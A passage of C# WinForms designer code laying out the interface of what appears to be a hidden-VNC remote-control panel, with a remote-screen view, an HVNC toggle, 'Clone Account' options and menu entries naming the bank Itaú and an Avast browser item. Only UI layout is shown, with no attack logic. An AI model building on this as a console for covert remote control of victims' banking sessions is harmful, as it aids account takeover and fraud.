            this.guna2HtmlLabel6 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox80 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel4 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel2 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox7 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel3 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox6 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel5 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
            this.guna2PictureBox23 = new Guna.UI2.WinForms.Guna2PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.statusled)).BeginInit();
            this.siticoneGradientPanel4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.VNCBox)).BeginInit();
            this.guna2ContextMenuStrip1.SuspendLayout();
            this.contextMenuStrip1.SuspendLayout();
            this.PainelDrag.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox22)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox19)).BeginInit();
            this.Painel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Icon_Application)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Icon_Home)).BeginInit();
            this.guna2Panel1.SuspendLayout();
            this.Painel_1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox44)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox37)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox41)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox36)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox29)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox45)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox24)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox12)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox30)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox42)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox28)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox27)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox21)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox18)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox17)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox13)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox20)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox31)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox38)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox35)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox16)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox43)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox34)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox10)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox33)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox15)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox25)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox32)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox26)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox80)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox23)).BeginInit();
            this.SuspendLayout();
            // 
            // QualityScroll
            // 
            this.QualityScroll.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.QualityScroll.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.QualityScroll, Guna.UI2.AnimatorNS.DecorationType.None);
            this.QualityScroll.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.QualityScroll.HoverState.Parent = this.QualityScroll;
            this.QualityScroll.Location = new System.Drawing.Point(-44, 178);
            this.QualityScroll.Name = "QualityScroll";
            this.QualityScroll.Size = new System.Drawing.Size(111, 23);
            this.QualityScroll.Style = Siticone.Desktop.UI.WinForms.Enums.TrackBarStyle.Metro;
            this.QualityScroll.TabIndex = 152;
            this.QualityScroll.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.QualityScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(this.QualityScroll_Scroll);
            // 
            // statusled
            // 
            this.statusled.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.statusled.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.statusled, Guna.UI2.AnimatorNS.DecorationType.None);
            this.statusled.ErrorImage = null;
            this.statusled.ImageRotate = 0F;
            this.statusled.Location = new System.Drawing.Point(47, 164);
            this.statusled.Name = "statusled";
            this.statusled.ShadowDecoration.Mode = Siticone.Desktop.UI.WinForms.Enums.ShadowMode.Circle;
            this.statusled.ShadowDecoration.Parent = this.statusled;
            this.statusled.Size = new System.Drawing.Size(20, 20);
            this.statusled.TabIndex = 153;
            this.statusled.TabStop = false;
            // 
            // ResizeScroll
            // 
            this.ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.ResizeScroll.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.ResizeScroll, Guna.UI2.AnimatorNS.DecorationType.None);
            this.ResizeScroll.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.ResizeScroll.HoverState.Parent = this.ResizeScroll;
            this.ResizeScroll.Location = new System.Drawing.Point(-44, 267);
            this.ResizeScroll.Name = "ResizeScroll";
            this.ResizeScroll.Size = new System.Drawing.Size(111, 23);
            this.ResizeScroll.Style = Siticone.Desktop.UI.WinForms.Enums.TrackBarStyle.Metro;
            this.ResizeScroll.TabIndex = 152;
            this.ResizeScroll.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.ResizeScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(this.ResizeScroll_Scroll);
            // 
            // siticoneGradientPanel4
            // 
            this.siticoneGradientPanel4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.siticoneGradientPanel4.Controls.Add(this.siticoneToggleSwitch_0);
            this.siticoneGradientPanel4.Controls.Add(this.statusled);
            this.siticoneGradientPanel4.Controls.Add(this.ledstatus);
            this.siticoneGradientPanel4.Controls.Add(this.IntervalLabel);
            this.siticoneGradientPanel4.Controls.Add(this.IntervalScroll);
            this.siticoneGradientPanel4.Controls.Add(this.label3);
            this.siticoneGradientPanel4.Controls.Add(this.ResizeScroll);
            this.siticoneGradientPanel4.Controls.Add(this.chkClone1);
            this.siticoneGradientPanel4.Controls.Add(this.QualityLabel);
            this.siticoneGradientPanel4.Controls.Add(this.QualityScroll);
            this.siticoneGradientPanel4.Controls.Add(this.chkClone);
            this.guna2Transition1.SetDecoration(this.siticoneGradientPanel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.siticoneGradientPanel4.FillColor = System.Drawing.Color.Black;
            this.siticoneGradientPanel4.FillColor2 = System.Drawing.Color.Black;
            this.siticoneGradientPanel4.Location = new System.Drawing.Point(-200, 527);
            this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
            this.siticoneGradientPanel4.ShadowDecoration.Parent = this.siticoneGradientPanel4;
            this.siticoneGradientPanel4.Size = new System.Drawing.Size(30, 17);
            this.siticoneGradientPanel4.TabIndex = 124;
            // 
            // siticoneToggleSwitch_0
            // 
            this.siticoneToggleSwitch_0.BackColor = System.Drawing.Color.Transparent;
            this.siticoneToggleSwitch_0.CheckedState.BorderColor = System.Drawing.Color.Black;
            this.siticoneToggleSwitch_0.CheckedState.BorderThickness = 1;
            this.siticoneToggleSwitch_0.CheckedState.FillColor = System.Drawing.Color.White;
            this.siticoneToggleSwitch_0.CheckedState.InnerBorderColor = System.Drawing.Color.Black;
            this.siticoneToggleSwitch_0.CheckedState.InnerBorderThickness = 2;
            this.siticoneToggleSwitch_0.CheckedState.InnerColor = System.Drawing.Color.White;
            this.siticoneToggleSwitch_0.CheckedState.Parent = this.siticoneToggleSwitch_0;
            this.guna2Transition1.SetDecoration(this.siticoneToggleSwitch_0, Guna.UI2.AnimatorNS.DecorationType.None);
            this.siticoneToggleSwitch_0.Location = new System.Drawing.Point(36, 207);
            this.siticoneToggleSwitch_0.Name = "siticoneToggleSwitch_0";
            this.siticoneToggleSwitch_0.ShadowDecoration.Parent = this.siticoneToggleSwitch_0;
            this.siticoneToggleSwitch_0.Size = new System.Drawing.Size(39, 20);
            this.siticoneToggleSwitch_0.TabIndex = 150;
            this.siticoneToggleSwitch_0.UncheckedState.BorderColor = System.Drawing.Color.Black;
            this.siticoneToggleSwitch_0.UncheckedState.BorderThickness = 1;
            this.siticoneToggleSwitch_0.UncheckedState.FillColor = System.Drawing.Color.White;
            this.siticoneToggleSwitch_0.UncheckedState.InnerBorderColor = System.Drawing.Color.Black;
            this.siticoneToggleSwitch_0.UncheckedState.InnerBorderThickness = 1;
            this.siticoneToggleSwitch_0.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.siticoneToggleSwitch_0.UncheckedState.Parent = this.siticoneToggleSwitch_0;
            this.siticoneToggleSwitch_0.CheckedChanged += new System.EventHandler(this.ToggleHVNC_CheckedChanged);
            // 
            // ledstatus
            // 
            this.ledstatus.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.ledstatus.AutoSize = true;
            this.ledstatus.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.ledstatus, Guna.UI2.AnimatorNS.DecorationType.None);
            this.ledstatus.ForeColor = System.Drawing.Color.Black;
            this.ledstatus.Location = new System.Drawing.Point(-106, 12);
            this.ledstatus.Name = "ledstatus";
            this.ledstatus.Size = new System.Drawing.Size(27, 13);
            this.ledstatus.TabIndex = 150;
            this.ledstatus.Text = "N/A";
            // 
            // IntervalLabel
            // 
            this.IntervalLabel.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.IntervalLabel.AutoSize = true;
            this.guna2Transition1.SetDecoration(this.IntervalLabel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.IntervalLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.IntervalLabel.Location = new System.Drawing.Point(-38, 148);
            this.IntervalLabel.Name = "IntervalLabel";
            this.IntervalLabel.Size = new System.Drawing.Size(88, 13);
            this.IntervalLabel.TabIndex = 6;
            this.IntervalLabel.Text = "Interval (ms): 500";
            this.IntervalLabel.Visible = false;
            // 
            // IntervalScroll
            // 
            this.IntervalScroll.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.IntervalScroll, Guna.UI2.AnimatorNS.DecorationType.None);
            this.IntervalScroll.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.IntervalScroll.HoverState.Parent = this.IntervalScroll;
            this.IntervalScroll.Location = new System.Drawing.Point(62, 122);
            this.IntervalScroll.Name = "IntervalScroll";
            this.IntervalScroll.Size = new System.Drawing.Size(59, 23);
            this.IntervalScroll.Style = Siticone.Desktop.UI.WinForms.Enums.TrackBarStyle.Metro;
            this.IntervalScroll.TabIndex = 152;
            this.IntervalScroll.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.IntervalScroll.Visible = false;
            this.IntervalScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(this.IntervalScroll_Scroll);
            // 
            // label3
            // 
            this.label3.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.label3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label3.ForeColor = System.Drawing.Color.Black;
            this.label3.Location = new System.Drawing.Point(-64, -110);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(77, 13);
            this.label3.TabIndex = 150;
            this.label3.Text = "Clone Account";
            // 
            // chkClone1
            // 
            this.chkClone1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.chkClone1.AutoSize = true;
            this.chkClone1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.chkClone1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.chkClone1.ForeColor = System.Drawing.Color.Gainsboro;
            this.chkClone1.Location = new System.Drawing.Point(311, -74);
            this.chkClone1.Name = "chkClone1";
            this.chkClone1.Size = new System.Drawing.Size(68, 13);
            this.chkClone1.TabIndex = 4;
            this.chkClone1.Text = "Resize : 50%";
            // 
            // QualityLabel
            // 
            this.QualityLabel.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.QualityLabel.AutoSize = true;
            this.QualityLabel.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.QualityLabel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.QualityLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.QualityLabel.Location = new System.Drawing.Point(103, -71);
            this.QualityLabel.Name = "QualityLabel";
            this.QualityLabel.Size = new System.Drawing.Size(52, 13);
            this.QualityLabel.TabIndex = 5;
            this.QualityLabel.Text = "HQ : 50%";
            // 
            // chkClone
            // 
            this.chkClone.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.chkClone.BackColor = System.Drawing.Color.Transparent;
            this.chkClone.CheckedState.BorderColor = System.Drawing.Color.Black;
            this.chkClone.CheckedState.BorderThickness = 1;
            this.chkClone.CheckedState.FillColor = System.Drawing.Color.White;
            this.chkClone.CheckedState.InnerBorderColor = System.Drawing.Color.Black;
            this.chkClone.CheckedState.InnerBorderThickness = 1;
            this.chkClone.CheckedState.InnerColor = System.Drawing.Color.White;
            this.chkClone.CheckedState.Parent = this.chkClone;
            this.guna2Transition1.SetDecoration(this.chkClone, Guna.UI2.AnimatorNS.DecorationType.None);
            this.chkClone.Location = new System.Drawing.Point(-3, 227);
            this.chkClone.Name = "chkClone";
            this.chkClone.ShadowDecoration.Parent = this.chkClone;
            this.chkClone.Size = new System.Drawing.Size(39, 20);
            this.chkClone.TabIndex = 150;
            this.chkClone.UncheckedState.BorderColor = System.Drawing.Color.Black;
            this.chkClone.UncheckedState.BorderThickness = 1;
            this.chkClone.UncheckedState.FillColor = System.Drawing.Color.White;
            this.chkClone.UncheckedState.InnerBorderColor = System.Drawing.Color.Black;
            this.chkClone.UncheckedState.InnerBorderThickness = 1;
            this.chkClone.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.chkClone.UncheckedState.Parent = this.chkClone;
            // 
            // timer2
            // 
            this.timer2.Enabled = true;
            this.timer2.Interval = 1000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // toolStripStatusLabel2
            // 
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
            this.toolStripStatusLabel2.Text = "Idle";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
            this.toolStripStatusLabel1.Text = "Statut :";
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // VNCBox
            // 
            this.VNCBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.guna2Transition1.SetDecoration(this.VNCBox, Guna.UI2.AnimatorNS.DecorationType.None);
            this.VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.VNCBox.ErrorImage = null;
            this.VNCBox.InitialImage = null;
            this.VNCBox.Location = new System.Drawing.Point(0, 0);
            this.VNCBox.Name = "VNCBox";
            this.VNCBox.Size = new System.Drawing.Size(1398, 704);
            this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.VNCBox.TabIndex = 40;
            this.VNCBox.TabStop = false;
            this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseDown);
            this.VNCBox.MouseEnter += new System.EventHandler(this.VNCBox_MouseEnter);
            this.VNCBox.MouseLeave += new System.EventHandler(this.VNCBox_MouseLeave);
            this.VNCBox.MouseHover += new System.EventHandler(this.VNCBox_MouseHover);
            this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseMove);
            this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseUp);
            // 
            // guna2ContextMenuStrip1
            // 
            this.guna2Transition1.SetDecoration(this.guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.itauToolStripMenuItem});
            this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(95, 26);
            // 
            // itauToolStripMenuItem
            // 
            this.itauToolStripMenuItem.Name = "itauToolStripMenuItem";
            this.itauToolStripMenuItem.Size = new System.Drawing.Size(94, 22);
            this.itauToolStripMenuItem.Text = "itau";
            this.itauToolStripMenuItem.Click += new System.EventHandler(this.itauToolStripMenuItem_Click);
            // 
            // contextMenuStrip1
            // 
            this.guna2Transition1.SetDecoration(this.contextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.antivirusToolStripMenuItem1});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(122, 26);
            // 
            // antivirusToolStripMenuItem1
            // 
            this.antivirusToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.avastSecurityToolStripMenuItem});
            this.antivirusToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("antivirusToolStripMenuItem1.Image")));
            this.antivirusToolStripMenuItem1.Name = "antivirusToolStripMenuItem1";
            this.antivirusToolStripMenuItem1.Size = new System.Drawing.Size(121, 22);
            this.antivirusToolStripMenuItem1.Text = "Antivirus";
            // 
            // avastSecurityToolStripMenuItem
            // 
            this.avastSecurityToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.openBrowserToolStripMenuItem});
            this.avastSecurityToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("avastSecurityToolStripMenuItem.Image")));
            this.avastSecurityToolStripMenuItem.Name = "avastSecurityToolStripMenuItem";
            this.avastSecurityToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
            this.avastSecurityToolStripMenuItem.Text = "Avast - Security - Beta";
            this.avastSecurityToolStripMenuItem.Click += new System.EventHandler(this.avastSecurityToolStripMenuItem_Click);
            // 
            // openBrowserToolStripMenuItem
            // 
            this.openBrowserToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("openBrowserToolStripMenuItem.Image")));
            this.openBrowserToolStripMenuItem.Name = "openBrowserToolStripMenuItem";
            this.openBrowserToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
            this.openBrowserToolStripMenuItem.Text = "Open";
            this.openBrowserToolStripMenuItem.Click += new System.EventHandler(this.openBrowserToolStripMenuItem_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(244, 6);
            // 
            // siticoneGradientPanel1
            // 
            this.siticoneGradientPanel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.guna2Transition1.SetDecoration(this.siticoneGradientPanel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.siticoneGradientPanel1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.siticoneGradientPanel1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.siticoneGradientPanel1.Location = new System.Drawing.Point(791, 1049);
            this.siticoneGradientPanel1.Name = "siticoneGradientPanel1";
            this.siticoneGradientPanel1.ShadowDecoration.Parent = this.siticoneGradientPanel1;
            this.siticoneGradientPanel1.Size = new System.Drawing.Size(31, 25);
            this.siticoneGradientPanel1.TabIndex = 125;
            // 
            // toolStripStatusLabel3
            // 
            this.toolStripStatusLabel3.AutoSize = true;
            this.toolStripStatusLabel3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.toolStripStatusLabel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.DarkGray;
            this.toolStripStatusLabel3.Location = new System.Drawing.Point(748, 1034);
            this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
            this.toolStripStatusLabel3.Size = new System.Drawing.Size(37, 13);
            this.toolStripStatusLabel3.TabIndex = 0;
            this.toolStripStatusLabel3.Text = "Status";
            this.toolStripStatusLabel3.Visible = false;
            this.toolStripStatusLabel3.TextChanged += new System.EventHandler(this.toolStripStatusLabel3_TextChanged);
            // 
            // siticoneBorderlessForm1
            // 
            this.siticoneBorderlessForm1.BorderRadius = 20;
            this.siticoneBorderlessForm1.ContainerControl = this;
            // 
            // siticoneDragControl1
            // 
            this.siticoneDragControl1.TargetControl = this.PainelDrag;
            // 
            // PainelDrag
            // 
            this.PainelDrag.Controls.Add(this.guna2ControlBox1);
            this.PainelDrag.Controls.Add(this.Guna2CirclePictureBox3);
            this.PainelDrag.Controls.Add(this.Guna2PictureBox5);
            this.PainelDrag.Controls.Add(this.Guna2HtmlLabel1);
            this.PainelDrag.Controls.Add(this.Guna2CirclePictureBox1);
            this.PainelDrag.CustomizableEdges.TopLeft = false;
            this.PainelDrag.CustomizableEdges.TopRight = false;
            this.guna2Transition1.SetDecoration(this.PainelDrag, Guna.UI2.AnimatorNS.DecorationType.None);
            this.PainelDrag.Dock = System.Windows.Forms.DockStyle.Top;
            this.PainelDrag.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.PainelDrag.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.PainelDrag.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.PainelDrag.Location = new System.Drawing.Point(0, 0);
            this.PainelDrag.MaximumSize = new System.Drawing.Size(1486, 47);
            this.PainelDrag.MinimumSize = new System.Drawing.Size(1486, 47);
            this.PainelDrag.Name = "PainelDrag";
            this.PainelDrag.Size = new System.Drawing.Size(1486, 47);
            this.PainelDrag.TabIndex = 126;
            // 
            // guna2ControlBox1
            // 
            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.BorderColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.BorderRadius = 3;
            this.guna2ControlBox1.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.guna2Transition1.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.IconColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.Location = new System.Drawing.Point(1423, 15);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.Size = new System.Drawing.Size(10, 10);
            this.guna2ControlBox1.TabIndex = 41;
            // 
            // Guna2CirclePictureBox3
            // 
            this.Guna2CirclePictureBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Guna2CirclePictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CirclePictureBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.Guna2CirclePictureBox3.ImageRotate = 0F;
            this.Guna2CirclePictureBox3.Location = new System.Drawing.Point(1418, 11);
            this.Guna2CirclePictureBox3.Name = "Guna2CirclePictureBox3";
            this.Guna2CirclePictureBox3.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.Guna2CirclePictureBox3.Size = new System.Drawing.Size(18, 18);
            this.Guna2CirclePictureBox3.TabIndex = 133;
            this.Guna2CirclePictureBox3.TabStop = false;
            this.Guna2CirclePictureBox3.Click += new System.EventHandler(this.Guna2CirclePictureBox3_Click);
            // 
            // Guna2PictureBox5
            // 
            this.Guna2PictureBox5.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox5.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox5.Image")));
            this.Guna2PictureBox5.ImageRotate = 0F;
            this.Guna2PictureBox5.Location = new System.Drawing.Point(12, 8);
            this.Guna2PictureBox5.Name = "Guna2PictureBox5";
            this.Guna2PictureBox5.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna2PictureBox5.TabIndex = 132;
            this.Guna2PictureBox5.TabStop = false;
            this.Guna2PictureBox5.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel1
            // 
            this.Guna2HtmlLabel1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Guna2HtmlLabel1, Guna.UI2.AnimatorNS.DecorationType.None);
